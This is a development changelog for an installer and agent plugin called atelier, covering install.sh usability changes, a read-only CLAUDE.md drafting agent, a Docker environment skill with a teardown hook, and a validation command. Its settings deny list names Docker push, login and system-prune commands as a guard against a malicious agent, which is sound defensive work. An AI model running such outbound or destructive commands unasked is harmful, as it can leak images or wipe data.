Before F4, Phase B silently kept whatever Claude / `atelier-author` / `atelier-reviewer` accounts were already authenticated. Operators reinstalling on a machine that hosted a different identity (shared mac, identity rotation, account compromise) had no in-flow path to swap accounts — they'd have to manually `claude logout` / `GH_CONFIG_DIR=… gh auth logout` before re-running install.sh.

**Delivered:**

- **`install.sh` — `phase_b_claude_login`** when `claude auth status` succeeds: reads the currently-authenticated email via `claude auth status 2>&1 | grep -Eio '[a-z0-9._%+-]+@…'`, prompts `Keep (Y) or switch (s)? [Y/s]`. On `s` / `S` / `switch`: runs `claude auth logout 2>/dev/null` then `claude auth login` (browser tab). On Enter / `Y` / anything else: keeps current account with a `step_skip`.
- **`install.sh` — `phase_b_atelier_gh_login`** symmetric treatment per role. Reads current login via `GH_CONFIG_DIR=$cfg gh api user --jq .login`, prompts `atelier gh (author) already authenticated as @login. Keep (Y) or switch (s)? [Y/s]`. On `s`: `GH_CONFIG_DIR=$cfg gh auth logout --hostname github.com` then falls through to the existing F5 permissions block + `gh auth login`. Keeps existing account by default.
- **Non-interactive short-circuit** — `$NONINTERACTIVE` (`--yes` / `-y`) or `[ ! -t 0 ]` (piped install, CI) both skip the prompt silently and keep the current account. Matches the safe-default pattern of every other interactive prompt in install.sh.

**Decisions captured:**

- **Default to keep on Enter.** Most re-runs are routine maintenance — the prompt should be Enter-able for fast progress. Switching is the unusual case.
- **No 3-way `claude` / `author` / `reviewer` prompt.** Each credential has its own prompt at its own call site; less to read at once, and operators can decide per identity rather than batch.

### M7.1.F3 — Detect outdated base deps + offer update opt-in — 2026-05-23
**PR:** _pending_

Phase A used to only check that base deps were *present*; freshness was opaque to the operator. Long-running atelier installs could silently drift to stale `gh` / `fnm` versions with no in-flow warning. F3 surfaces outdatedness in Phase A and lets the operator opt in to an update right there.

**Delivered:**

- **`install.sh` — new `_offer_dep_update <dep> <current> <latest> <update_cmd>`** helper. Behavior matrix:
  - `ATELIER_SKIP_UPDATE_PROMPTS=1` → skip-line only (silent unless logs are scanned).
  - `--yes` / `-y` / `[ ! -t 0 ]` (non-interactive) → skip-line with a manual `update_cmd` hint.
  - Interactive: prompt `↷ <dep> X (latest Y available) — update now via \`<cmd>\`? [y/N]:`. Defaults to **N** on Enter. On `y` / `Y`: `eval` the update_cmd and confirm with `step_ok`.
- **`install.sh` — `phase_a_mac_deps`** uses `brew outdated --json --formula` (single batched call) to detect outdatedness for `gh` and `fnm`. Parses `installed_versions[0]` + `current_version` via `jq` to feed `_offer_dep_update`. Update command: `brew upgrade $pkg`.
- **`install.sh` — `phase_a_linux_deps`** uses `apt list --upgradable 2>/dev/null | grep '^gh/'` to detect an outdated `gh` (the only apt-managed dep atelier ships on Debian/Ubuntu — `fnm` on Linux comes from the curl installer, not apt). Parses `latest amd64 [upgradable from: current]` format. Update command: `sudo apt-get update && sudo apt-get install -y gh`.

**Decisions captured:**

- **Scoped to `gh` + `fnm` on macOS, `gh` on Linux.** ROADMAP scope listed every dep (node, pnpm, docker compose v2, git-wt). Limited to the OS-package-manager-managed ones because they're the safest to auto-update; node/pnpm have their own ecosystem update paths (fnm/corepack) and need more careful detection; docker compose v2 / git-wt have separate drift mechanisms (system-level / M1.6 `/doctor` SHA check). Captured as a follow-up if it surfaces friction.
- **Default to NO on Enter.** Updating in the middle of an install is invasive — the operator may have other in-flight work depending on the current version. Forcing a deliberate `y` keystroke is the conservative choice.
- **Helper uses `eval` on the update_cmd string** so callers can pass multi-command sequences (`sudo apt-get update && sudo apt-get install -y gh`). Trusted input — callers in `install.sh` only, not operator-provided.

### M7.1.F1 — Strip M5.0.2 PREFLIGHT BEHAVIOUR design block from `--help` output — 2026-05-23
**PR:** _pending_

`install.sh --help` used to print a 9-line `PREFLIGHT BEHAVIOUR (M5.0.2):` block documenting atelier's internal config-dir collision state machine. That text was design documentation aimed at future maintainers — it didn't help an operator running `--help` to learn the available CLI flags, and dilutes operator-facing output with milestone IDs / internal contract framing.

**Delivered:**

- **`install.sh` — `usage()`** loses the trailing `PREFLIGHT BEHAVIOUR (M5.0.2):` block. The block's content is preserved in code comments at the contract owners (`preflight_check()`, `mark_install_started()`, `phase_0_preflight()`) — the canonical place for design documentation since v0.4.2.
- **`--help` output** now ends at `--help, -h            Show this help and exit.` — clean, operator-facing.

**Decisions captured:**

- **Comments over docs.** The block could have moved to a new `docs/install-internals.md`. Chose code comments because the state machine is small enough to live next to the code that implements it, and atomic with future changes (anyone editing the marker contract sees and updates the doc in the same diff).
- **No `--help` audit beyond this block.** The rest of `usage()` (USAGE, OPTIONS) is straightforward operator-facing reference — no other leakage detected.

### M7.1.F12 — End-of-install "first steps" guide for the operator — 2026-05-23
**PR:** _pending_

Before F12, a successful install ended with a single line — `==> install.sh done. Open a new terminal (or run source ~/.zshrc) to use task and task-status.` — that left a non-technical operator with no idea what to do next (set up a project? run doctor? start a task? uninstall?). F12 replaces it with a structured, copy-pasteable next-steps block.

**Delivered:**

- **`install.sh` — new `print_first_steps`** function (called from `main()` after `mark_install_complete`). Six numbered steps: reload shell → verify install via `/atelier:doctor` → set up first project via `/atelier:setup-project <path>` → start first task via `task` → find docs (README, PLAN.md §12, dogfood-guide) → uninstall safely (`atelier-uninstall` / `--purge`). Each step has a bold heading + a cyan command on its own line, indented for readability.
- **`main()` simplified** — removed the old one-line `install.sh done…` log; `print_first_steps` is now the closing signal.

**Decisions captured:**

- **`phase "Install complete"` as the closing bookend.** Reuses the F2 phase header style so the end of install matches the rest of the script visually. Cleaner than a custom box-drawing separator.
- **Hard-coded numbered steps.** No conditional logic (e.g. "only show step 2 if Phase B succeeded"). Trade-off: simpler + predictable for the operator; warnings from earlier phases already surface in-place.

### M7.1.F10 — Suppress git-wt sub-installer's "installation complete" epilogue — 2026-05-23
**PR:** _pending_

Phase C.1 delegates to `/tmp/git-wt/install.sh --skill-for=claude`. The upstream installer prints its own `==> installation complete / next steps: Restart your shell…` epilogue, which non-technical operators read as "atelier is done" — while in reality Phase C.1 still has git-identity prompts + helper symlinks + Phase C.2 to go. F10 drops the misleading epilogue without losing the useful per-action confirmations above it.

**Delivered:**

- **`install.sh` — `phase_c_1_git_wt`** pipes the sub-installer's output through `awk 'BEGIN { skip=0 } /^==> installation complete$/ { skip=1 } !skip { print }'`. The four useful lines above the sentinel (`==> installed binary →`, `==> recorded clone path →`, `==> added wrapper to`, `==> installed skill →`) still print; everything from `==> installation complete` onward is suppressed.

**Decisions captured:**

- **awk filter over upstream flag.** ROADMAP allowed either coordinating a `--quiet` flag with upstream (atelier maintains AkaLab-Tech/git-wt) or filtering locally. Local awk is faster to ship and reversible — no cross-repo dependency. If a `--quiet` flag lands upstream later, swapping the implementation is one line.
- **`set -o pipefail` preserved.** The pipe to awk inherits `set -o pipefail`; a failed git-wt installer still aborts `install.sh` (awk doesn't mask exit codes).

### M7.1.F5 — Phase B: explain GitHub permission requirements before each `gh auth login` — 2026-05-23
**PR:** _pending_

Before F5, each `gh auth login` invocation printed a one-line role description (`atelier gh login: author — the GitHub account…`) and went straight into the device-code OAuth flow. Operators frequently authenticated with whatever account was convenient — sometimes one without push access to the target repo, or not a member of the project's GitHub org — causing silent failures later when pushes / PRs / approvals were rejected.

**Delivered:**

- **`install.sh` — new `_phase_b_print_gh_permissions`** helper called from `phase_b_atelier_gh_login` right before `gh auth login`. Prints a yellow-headlined block per role:
  - **author**: "atelier commits + pushes + opens PRs + manages issues under this account. Required access: push on every project repo."
  - **reviewer**: "atelier-reviewer agent approves PRs opened by the author identity. Required access: at least read + review on every project repo. MUST be a DIFFERENT GitHub account than author (PLAN.md dogfood-1 Finding #11)."
  - Org reminder for both: "must be a member or invited collaborator BEFORE this login — otherwise pushes/PRs/approvals fail later."
- **Explicit Enter to proceed** — operator presses Enter to confirm they've read the block before the device-code page opens; Ctrl+C aborts cleanly.

**Decisions captured:**

- **Block prints unconditionally** when the role's gh dir is not yet authenticated. On a re-run where `step_skip "atelier gh ($role) already authenticated"` short-circuits, the block does NOT print — so idempotent re-runs stay quiet.
- **Per-role differentiation in a single helper.** A `case "$role" in author|reviewer)` keeps both copies of the block close together so future changes (additional scopes, new role) stay aligned.

### M7.1.F2 — `install.sh` output legibility (colors, section headers, progress markers) — 2026-05-23
**PR:** _pending_

The pre-F2 output was monochrome and flat: Phases A / B / C.1 / C.2 blurred together; sub-steps had no visual hierarchy; success / skip / fail looked identical. For a non-technical operator following a multi-minute install, it was hard to tell where they were or whether something quietly broke. F2 introduces ANSI color + Unicode markers with automatic degradation when stdout is not a TTY or `NO_COLOR` is set.

**Delivered:**

- **`install.sh` — new logging helpers** in the M7.1.F2 block:
  - Color detection: `[ -t 1 ] && [ -z "${NO_COLOR:-}" ] && [ -z "${ATELIER_NO_COLOR:-}" ]` toggles eight `_C_*` constants between ANSI escape codes and empty strings. Cached once at script load so every helper reads the same state.
  - `phase()` — phase header with leading blank line, bold cyan `==> Phase X`. Used for Phase 0 / A / B / C.1 / C.2 / Verification / Install complete.
  - `log()` — generic banner (no leading blank line).
  - `sublog()` — indented sub-step, plain text. Unchanged signature, no marker.
  - `step_ok()` — indented `✓` in green for confirmations within a phase.
  - `step_skip()` — indented `↷` in dim for explicit no-ops (already installed, already configured, etc.).
  - `step_fail()` — indented `✗` in red, written to stderr. Non-fatal.
  - `warn()` — yellow `!!` prefix, stderr.
  - `die()` — bold red `!! ERROR:` prefix, stderr, exit 1.
  - `ok()` — bold green `✓` end-of-phase marker.
- **Call-site updates throughout `install.sh`**:
  - All six phase entries converted: `log "Phase X …"` → `phase "Phase X …"`.
  - Idempotent dep checks converted: ~13 `sublog "X already installed"` / `sublog "X detected"` lines → `step_skip` / `step_ok` (Phase A deps, Phase B already-authenticated checks, Phase C.1 git-wt SHA check, Phase C.2 marketplace + plugin idempotency).
  - Phase B identity captures use `step_ok` (`atelier identities OK: …`, `atelier-author git identity captured: …`).
  - Old `VERIFY_OK` / `VERIFY_FAIL` constants in `verify_cmd` / `verify_plugin` (Phase Verification) removed — both helpers now route through `step_ok` / `step_fail` so colors + markers stay consistent end-to-end.

**Decisions captured:**

- **Non-ASCII markers (`✓ ↷ ✗`) ARE used** despite the original "ASCII-only" comment. The convention block was updated to reflect the new policy: modern terminals on macOS + apt-Linux render UTF-8 cleanly; the `commands/doctor.md` slash command already used these markers; and the `NO_COLOR` / non-TTY auto-degrade still produces clean plain output for log capture.
- **`step_ok` for "detected" vs `step_skip` for "already installed".** Both are idempotent, but "detected" reads as "we needed this and found it" (positive confirmation) while "already installed" reads as "we would have installed this if you didn't have it" (skipped a possible action). Visually the operator sees a quick scan: lots of `↷` = idempotent re-run; lots of `✓` = first install hitting fresh dependencies.
- **Operator override via `ATELIER_NO_COLOR=1`** in addition to the standard `NO_COLOR`. Matches the `--yes` / `ATELIER_AUTO` style of atelier-specific flags so a CI run can force plain output even when running on a TTY.

### M7.1.F11 — Document `$ATELIER_CONFIG_DIR` lookup order + add `/doctor` check — 2026-05-23
**PR:** [#70](https://github.com/AkaLab-Tech/atelier/pull/70)

F11's audit revealed the persistence model already works end-to-end: `phase_c_1_shellrc_hooks` bakes `export ATELIER_CONFIG_DIR=<resolved-path>` into the operator's `~/.zshrc` / `~/.bashrc` (line 991 of `install.sh`), and downstream tooling (`scripts/atelier-uninstall` line 99, `scripts/atelier-setup-project` line 259) already reads the env var with a `~/.claude-work/` fallback. The chain is intact — what was missing was explicit documentation and a verification check.

**Delivered:**

- **`install.sh` — comment on `resolve_config_dir`** explaining the persistence model (resolved path baked into shellrc hook block → downstream tools inherit via env var → lookup order `--config-dir flag > $ATELIER_CONFIG_DIR env > default`).
- **`commands/doctor.md` — new check `h.`** verifying (1) `$ATELIER_CONFIG_DIR` is set + directory exists, (2) `.atelier-managed` marker present + JSON-parses, (3) marker's `installStatus` is `complete` (an `in_progress` value points at the F6 resume path). Reports `✓ atelier config dir <path> (installStatus: complete)` on success; `✗` with the appropriate `source ~/.zshrc` / `install.sh` fix command otherwise. Output-format example updated.

**Decisions captured:**

- **Env var only, no config file.** The F11 entry allowed either; chose env var to match the existing M5.0 design (no new XDG file to manage). Operators who deliberately edit out the shellrc export get caught by the doctor check, not by silent fallback to `~/.claude-work/`.
- **Documentation is the deliverable.** No code logic changed — the chain already worked. The fix is making the contract observable (doctor check) and findable (install.sh comment).

### M7.1.F9 — Force HTTPS for marketplace `git clone` (PLAN.md §2 conformance) — 2026-05-23
**PR:** [#70](https://github.com/AkaLab-Tech/atelier/pull/70)

`claude plugin marketplace add AkaLab-Tech/claude-plugins` was defaulting to SSH clone (`Cloning via SSH: git@github.com:AkaLab-Tech/claude-plugins.git`), violating the hard constraint in [PLAN.md §2](PLAN.md) step 5 ("GitHub auth: HTTPS only. **Never** generate, reference, or rely on SSH keys."). Phase C.2 succeeded on machines with SSH keys configured *outside* atelier but would fail with an opaque SSH error on a clean Mac without keys.

**Delivered:**

- **`install.sh` — `ATELIER_MARKETPLACE_SOURCE` constant** changed from the `org/repo` shortcut `"AkaLab-Tech/claude-plugins"` to the full HTTPS URL `"https://github.com/AkaLab-Tech/claude-plugins.git"`. With the URL form, `git clone` no longer guesses the protocol — HTTPS is explicit.
- **Comment block** at the constant explaining the F9 rationale so a future reader doesn't revert to the shortcut for terseness.

**Decisions captured:**

- **Constant change over env-var override.** The ROADMAP scope listed `GIT_CONFIG_COUNT=...` + `url.https://...insteadOf git@github.com:` as a fallback if the CLI rejected URL form. Tested by inspection: `claude plugin marketplace add` accepts full git URLs directly. The constant change is the minimal, most explicit fix — and it also fixes the operator-facing manual fallback (`phase_c_2_print_manual_commands`) which uses the same constant.

### M7.1.F7a — Capture atelier-author git identity into `$ATELIER_CONFIG_DIR/git-identity.conf` (install side) — 2026-05-23
**PR:** [#70](https://github.com/AkaLab-Tech/atelier/pull/70)

Install-side delivery of M7.1.F7. The end-to-end acceptance (atelier commits authored by atelier-author rather than the operator) splits across two PRs: F7a (install writes the identity file) closed here; F7b (orchestrator + commit-creating subagents adopt the file via `GIT_CONFIG_GLOBAL`) tracked separately on the ROADMAP.

**Delivered:**

- **`install.sh` — new `phase_b_capture_atelier_git_identity`** (called after `phase_b_verify_distinct_identities`). Reads `.login`, `.id`, `.name`, `.email` from `GH_CONFIG_DIR=$ATELIER_CONFIG_DIR/gh/author gh api user`, then writes `$ATELIER_CONFIG_DIR/git-identity.conf`:

  ```ini
  [user]
      name = <gh .name or .login>
      email = <gh .email or <id>+<login>@users.noreply.github.com>
  ```

  Tolerant of missing `gh` data: warns + skips (does not fail install).

**Decisions captured:**

- **GitHub no-reply email pattern as default.** Fresh service accounts rarely expose a public email. The `<numeric-id>+<login>@users.noreply.github.com` form is the GitHub-blessed no-reply that survives login renames (the id is the stable key).
- **Operator's `~/.gitconfig` stays untouched.** F7a writes to atelier's isolated config dir only. F7b will mount the file via `GIT_CONFIG_GLOBAL` so the operator's personal identity is unaffected outside atelier worktrees.
- **F7 split into F7a + F7b.** F7a is a write-once install step; F7b is cross-cutting orchestrator + agent work. Splitting keeps PR-A focused on install.sh and lets F7b ship as its own reviewable change. ROADMAP entry for F7b explicitly notes `blocked_by: F7a (delivered)`.

### M7.1.F6 — Resumable installs via `install_status: in_progress` marker — 2026-05-23
**PR:** [#70](https://github.com/AkaLab-Tech/atelier/pull/70)

Before F6, `install.sh` planted the `.atelier-managed` marker mid-Phase C.1. Any failure before that point (token expiry mid-Phase B, `Ctrl+C` at any point, Phase C.2 marketplace clone fail, etc.) left `$ATELIER_CONFIG_DIR` partially populated **without** the marker. The next `./install.sh` ran the M5.0.2 preflight collision check on the half-populated dir, failed to find the marker, and refused to reuse the directory — forcing the operator to pick an alternative path even though they actually wanted to retry. Observed in dogfood-2: a Phase B token expiry left `~/.claude-work/{.claude.json,backups,gh}` adrift; the retry rejected the path.

**Delivered:**

- **`install.sh` — two new functions** in the marker block:
  - `mark_install_started` — runs from `phase_0_preflight` as soon as preflight commits to writing under `$ATELIER_CONFIG_DIR`. Plants the marker with `installStatus: in_progress`, `pid: $$`, `startedAt: <iso8601>`, and `atelierConfigDir`.
  - `mark_install_complete` — runs from `main()` after `phase_verify` succeeds. Stamps the marker `installStatus: complete` + `completedAt` + `installerVersion`.
- **`preflight_check`** extended with a third return code: `0` safe / `1` collision / `2` `in_progress` (resumable). The `in_progress` detection is a `grep` for the literal JSON key/value pair in the marker file — robust to whitespace, doesn't drag in a JSON parser.
- **`phase_0_preflight`** gets a `case` over the new return codes. On `2`: prints `previous atelier install at <path> did not complete` and prompts `resume previous install? [Y/abort]:`. `Y` (or Enter) → `mark_install_started` (refresh pid + timestamp) + proceed. `--yes` non-interactive mode auto-resumes with a `sublog` line. Anything else → `die "aborted by operator"`.
- **`phase_c_1_claude_config_dir`** simplified — no longer writes the marker (F6's `mark_install_started` planted it earlier). Function now just confirms the directory exists.

**Decisions captured:**

- **JSON marker schema retained.** The M5.0.2 marker was already JSON. F6 swaps the fields (`installedAt` → `startedAt` / `completedAt`, adds `installStatus` + `pid`) without changing the encoding. `grep` for the in_progress sentinel string is good enough — no `jq` dependency needed inside `preflight_check`.
- **Backwards compat for legacy markers.** A pre-F6 marker (no `installStatus` field) reads as `complete` — `grep` for `in_progress` misses, falls through to the existing-file `return 0`. The next run then rewrites it with the new schema. No migration step required.
- **Resume refreshes the marker.** On Y, `mark_install_started` runs again with a new `pid` and `startedAt`. This avoids stale-pid confusion if the operator inspects the marker between attempts.

### M4.19 — `/setup-project` auto-generates root `CLAUDE.md` (interview or codebase scan) — 2026-05-23
**PR:** _pending_

Before this milestone, `/atelier:setup-project` wrote the atelier-specific `.claude/CLAUDE.md` from a generic template but left the **root** `CLAUDE.md` entirely up to the operator. Every new task started with effectively zero project context. M4.19 drafts root `CLAUDE.md` automatically, branching on whether the project is **new** (interview operator + draft) or **existing** (read-only scan + draft).

**Two-phase design:**

- **Phase 1 (bash helper)** — `scripts/atelier-setup-project` does mechanical scaffolding + detection. New `detect_project_mode()` runs the heuristic; new `--mode=new|existing` flag overrides; new `detect_root_claude_md()` checks idempotency. Both signals emitted as marker lines (`atelier-detected-mode=...`, `atelier-root-claude-md=...`) that Phase 2 parses.
- **Phase 2 (slash command)** — `commands/setup-project.md` parses the markers and dispatches based on a 3-row decision table: present → skip; missing + existing → `project-profiler` scan; missing + new → `AskUserQuestion` interview, then `project-profiler` in `new` mode with the operator's answer.

**Heuristic** — `new`: not a git repo OR 0 commits OR ≤3 tracked files all docs-only (README*, LICENSE*, .gitignore). `existing`: any manifest file (package.json / go.mod / Cargo.toml / pyproject.toml / Gemfile / build.gradle* / composer.json / mix.exs / requirements*.txt) OR populated src/lib/app OR >3 tracked files. `--mode=new|existing` overrides.

**Delivered:**

- **`scripts/atelier-setup-project` (+142 lines)** — heuristic + `--mode` flag + emits `atelier-detected-mode=...` and `atelier-root-claude-md=...` marker lines.
- **`agents/project-profiler.md` (Sonnet, +130 lines, new)** — tools restricted to `Read`, `Glob`, `Grep`, `Write`. Never executes project code, installs, reaches network, overwrites root CLAUDE.md. Two modes: `existing` (scan manifests → src layout → CI configs → README) + `new` (paraphrase operator's free-form answer + TBD markers).
- **`templates/project-claude-root.md.template` (+35 lines, new)** — placeholder structure for both modes.
- **`commands/setup-project.md` (+45 lines net)** — `allowed-tools` gains `Read, Glob, Grep, AskUserQuestion, Task`. New Phase 2 with 3-row decision table + non-interactive `new`-mode refusal rule.
- **`.claude-plugin/plugin.json`** — version `0.3.0` → `0.4.0` (MINOR per [PLAN.md §14.2](PLAN.md) — new agent + new template + new helper subcommand + new slash command step).

**Tests (7/7 pass pre-merge):**

| # | Scenario | Got |
| --- | --- | --- |
| T1 | `bash -n` | ✓ |
| T2 | `jq empty` + frontmatter (3+5+3 keys) | ✓ |
| T4 | Empty tmp dir | `new` + `missing` ✓ |
| T5 | Populated repo (package.json + src/) | `existing` + `missing` ✓ |
| T6 | `--mode=new` on populated | force `new` ✓ |
| T7 | Root CLAUDE.md present | `present` + preserved ✓ |
| T8 | `--mode=bogus` | die ✓ |

Behavioural validation (Phase 2 actually invoking `project-profiler` end-to-end) deferred to next real `/atelier:setup-project` run.

**Decisions captured:**

- **Detection in bash, drafting in agent.** Bash runs the deterministic heuristic; AI drafting needs an LLM that bash cannot invoke. Two `key=value` marker lines is the slimmest interface between phases.
- **`project-profiler` is read-only.** No `Bash` in tools list. If it cannot infer something, it leaves `TBD`. Same threshold as `reviewer`'s "evaluate; do not change" from M4.20.
- **`new` mode requires interactive operator answer.** Slash command refuses dispatch under `--yes` / `$ATELIER_AUTO`. Operator can pass `--mode=existing` to skip the interview. Prevents autonomous chains from fabricating from a fabricated answer.
- **Single template for both modes.** `project-claude-root.md.template` has TBD markers everywhere; existing-mode replaces them with detected signal, new-mode leaves most TBD. Same structure, two fill-rates.
- **Bash helper does NOT invoke project-profiler.** The binary runs from both terminal and slash-command context. Keeping the dispatch in the slash command makes both paths symmetric.
- **`--mode=bogus` dies early.** Validated post arg parse with clear error. Same pattern as `--per-task-settings` validation from M4.16.

**Acceptance status:** **fully passed statically.** All four ROADMAP criteria verified via the 7-test suite above. Runtime confirmation of Phase 2 dispatch deferred to next real run.

**Follow-ups:**

- **Per-language scan depth tuning** — current implementation picks the first matching manifest. For polyglot repos, multi-stack support is captured as a future tweak.
- **`/refresh-claude-md` flow for `update.sh` (M6.1)** — operator may want to refresh root CLAUDE.md after major project changes. A separate slash command that explicitly invokes `project-profiler` with overwrite consent. Out of M4.19 scope.

**Validation artifact** — drafted `CLAUDE.md` captured from the pre-merge end-to-end run (T4-validation, 2026-05-23). Fixture: fresh git repo with `package.json` (vitest + ESLint + TypeScript deps), `tsconfig.json` strict, `src/hello.ts`, `test/hello.test.ts`, `README.md` with non-goals section. Slash command invoked as `claude --plugin-dir <wt> -p "/atelier:setup-project --plugin-root <wt> --yes ."`. Bash helper Phase 1 emitted `atelier-detected-mode=existing` + `atelier-root-claude-md=missing`. Phase 2 dispatched `project-profiler` (Sonnet), which returned a 35-line drafted block; slash command extracted + wrote the file. Total wall time ~90 seconds.

````markdown
# CLAUDE.md

Minimal TypeScript utility app (`sample-app`) with vitest tests and ESLint. Intended as a lightweight, non-production reference codebase — no UI, no deployment pipeline.

## Stack

- **Language**: TypeScript 5.x (strict mode, target ES2022)
- **Framework**: none
- **Package manager**: npm (no lockfile detected — verify before installing)
- **Test runner**: vitest 1.x
- **Linter / formatter**: eslint 8.x (no formatter config detected)

## Architecture

Single-module layout under `src/`:

- `src/hello.ts` — sole source file; exports a `hello(name)` string utility

No `lib/` or `app/` directories present.

## Conventions

- **Tests**: `npm test` (runs `vitest run`)
- **Lint**: `npm run lint` (runs `eslint .`)
- **Typecheck**: `npm run typecheck` (runs `tsc --noEmit`)
- **CI**: TBD — no `.github/workflows/` found

## What this project is NOT

- Not a production deployment target
- Not a UI / frontend project

## Out of scope for AI agents

- TBD
````

**Quality observations on the drafted content:**

- Stack section: correctly inferred TypeScript 5.x with strict + ES2022 from `tsconfig.json`; vitest 1.x and eslint 8.x from `package.json:devDependencies`; pitched "npm" as package manager with a verify-before-installing caveat (no lockfile detected — accurate signal).
- Architecture: identified the single source file under `src/` and noted absence of `lib/` / `app/` — matches the scan order in the agent's prompt.
- Conventions: extracted `npm test`, `npm run lint`, `npm run typecheck` directly from `package.json:scripts`. CI correctly TBD (no `.github/workflows/`).
- Non-goals: captured *production deployment* and *UI / frontend* from the README's `## Non-goals` section verbatim (paraphrased).
- Out of scope for AI agents: TBD — correctly left empty rather than fabricated. No signal in the source.

The drafted file is operator-readable, accurate, and ready for the operator's first `/next-task` to use as project context. Any follow-up refinement (e.g., adding more architectural detail when the codebase grows) can happen via the operator's `Edit` to the file directly.

### M4.17 — `docker-env` skill + `docker-runner` agent (on-demand local containers) — 2026-05-23
**PR:** _pending_

On-demand Docker Compose stack scoped to the task worktree, without contaminating the operator's host. Lets a task that needs Postgres / Redis / MySQL / MinIO / etc. for integration tests provision a service for the duration of the task and tear it down cleanly at session end — no orphan containers, no manual host installs.

**Two-piece design:**

- **`agents/docker-runner.md`** (Sonnet, new) — authors `Dockerfile` / `docker-compose.yml`. Pins image tags per [PLAN.md §4](PLAN.md) dep-install rules (official images, no `:latest`, no <7-day-old tags), declares healthchecks per service, picks non-default host ports (e.g. `5433:5432` for Postgres) to avoid collision with operator services. Refuses to clobber an existing compose file.
- **`skills/docker-env/SKILL.md`** (new) — lifecycle operations: `up` (with `--wait` so healthchecks must pass), `down` (keeps volumes), `teardown` (removes volumes + orphans, called by Stop hook + auto-merge), `logs <service>`, `ps`. Compose project name = `<branch>` with `task/` stripped — gives parallel tasks isolated networks + volumes. Probes `docker info` and stops with an actionable message if the daemon is unreachable.

**Stop hook (`hooks/teardown-docker-env.sh`, new + wired in `hooks.json`):**

Tears down the per-task compose project on session end. Three guards make the hook safe on non-atelier sessions:

1. cwd's branch must match `task/<id>-<slug>` (regular operator sessions are no-op).
2. `docker info` must succeed (no daemon → no-op).
3. The compose project must have at least one container (idempotent on already-empty projects).

Only when all three guards pass does the hook issue `docker compose -p <project> down --volumes --remove-orphans`. Fails soft on every recoverable error.

**`templates/settings.template.json` deltas:**

- **`ask` shrinks** — `Edit(<worktree>/Dockerfile)`, `Write(<worktree>/Dockerfile)`, `Edit(<worktree>/docker-compose*)`, `Write(<worktree>/docker-compose*)` and the `<worktree>-worktrees/**` variants removed. These paths are now covered by the existing `Edit(<worktree>/**)` / `Write(<worktree>/**)` allow rules (no prompt for `docker-runner` to scaffold inside the worktree).
- **`ask` keeps** — `Edit(./Dockerfile)` / `Write(./Dockerfile)` / docker-compose* on relative path (cwd ambiguity).
- **`allow` gains** — `Bash(docker info*)`, `Bash(docker compose*)`, `Bash(docker ps*)`, `Bash(docker logs*)`.
- **`deny` gains** — `Bash(docker push*)`, `Bash(docker login*)`, `Bash(docker system prune*)`. Defensive.
- **[PLAN.md §6](PLAN.md) auto-merge block unchanged** — PRs touching `Dockerfile` / `docker-compose*` still fall back to human review.

**`agents/task-orchestrator.md` step 5 update:**

- `docker-runner` added to the specialist dispatch list as a **conditional** specialist — BEFORE `implementer` when the task acceptance criteria mention a containerized service.
- New "When to dispatch `docker-runner`" sub-section documents the trigger heuristic (explicit service names + phrase patterns) and the skip rule (pure docs / UI-only / refactor tasks).

**`.claude-plugin/plugin.json`:** version `0.2.0` → `0.3.0`. Per [PLAN.md §14.2](PLAN.md), new agent + new skill + new hook = minor bump.

**Tests:**

- `bash -n` on `install.sh` + `scripts/*` + `hooks/*.sh` (including the new `teardown-docker-env.sh`): all pass.
- `jq empty` on `plugin.json` + `settings.template.json` + `.mcp.json` + `hooks.json`: all pass.
- YAML frontmatter parses on `docker-runner.md` (5 keys) and `SKILL.md` (2 keys).
- **End-to-end behavioural validation deferred** — exercising the full `docker-runner` → `docker-env up` → `implementer` → `Stop` hook teardown cycle requires (a) a Docker runtime running and (b) a task whose acceptance criteria actually need a container. Neither is set up in the current dev environment; will be exercised the next time a real project requests Postgres / Redis. Static + structural surface is fully covered by `structural` CI (M1.7).

**Decisions captured:**

- **Two-piece (agent + skill), not one.** Authoring is a judgment call (image / tag / healthcheck) — agent prompt. Lifecycle is mechanical — skill. Mixing would force every `docker compose up -d --wait` through Sonnet, which is slow and wasteful.
- **Compose project name = branch with `task/` stripped, not directory name.** `docker compose`'s default could collide across worktree directories with similar names. Explicit `-p <project_name>` keyed off the branch is the isolation guarantee.
- **Stop hook, not auto-merge-only teardown.** Catches operator-interrupted sessions where the chain never completes. Triple-guarded so non-atelier sessions are no-op.
- **No `/docker-env` slash command yet.** Defer until operator friction surfaces.
- **`install.sh` does NOT install a Docker runtime.** Operator chooses Docker Desktop / Colima / OrbStack. The skill probes `docker info` and surfaces install commands when missing.
- **`docker push` / `docker login` / `docker system prune` denied.** Explicit deny entries; defensive against a malicious or buggy agent. Same threshold as the existing deny list.

**Acceptance status:** **fully passed statically.** All five ROADMAP criteria verified by reading the new files against the spec. Runtime confirmation deferred per the "Tests" note above.

**Follow-ups:**

- **`/docker-env` slash command** — operator-facing entry. Captured if/when operators ask for it.
- **`docker-runner` integration with `safe-install`** — if `safe-install` grows a Docker-image variant, route through it.
- **End-to-end run on a Python-with-Postgres dogfood project** — when a real task surfaces.

### M4.14 — Implement↔validate inner loop with iteration budget — 2026-05-23
**PR:** _pending_

Before this milestone, the `/next-task` chain ran implementation + validation as a single forward pass: any failure (lint, typecheck, unit test) fell straight through to `retry-with-logs`, which reset the entire worktree and restarted the task from scratch. The cost of a typo / missing import / trivial lint error was the same as a fundamental design failure — both triggered a full reset of attempts 1-3 before the slower attempts 4-6.

M4.14 splits the implementer's "did it work?" question from the heavier PR gate, giving `task-orchestrator` a cheap inner loop to iterate against the **fast** validation layer (lint + typecheck + unit/integration tests) before paying the **slow** layer's cost (Playwright e2e + screenshots). The inner loop is anchored to the same 3+3 retry budget — no new counter, just a finer-grained use of the existing one.

**Delivered:**

- **`commands/validate.md` (+110 lines, new file)** — slash command that runs the project's validation gate against the current worktree and prints a structured pass/fail report the orchestrator can parse.
  - **Fast layer (default):** detects + runs lint (eslint / biome / prettier / ruff / project's `lint` script), typecheck (tsc / mypy / pyright / project's `typecheck` script), and unit/integration tests (vitest / jest / pytest / project's `test` script). Skipping checks is allowed only when the tooling is truly absent; a project with no tests configured at all marks the overall validation as failed (deliberate exemption available via a no-op `test` script).
  - **`--full` flag:** also runs Playwright e2e + screenshot capture via the existing `visual-validation` skill. Slow layer is the PR-gate equivalent of PLAN.md §6; runs ONCE before `pr-author`, never inside the inner loop.
  - **Read-only by design:** the command never fixes issues, writes tests, or installs dependencies — those are `implementer`'s, `tester`'s, and `safe-install`'s jobs respectively.

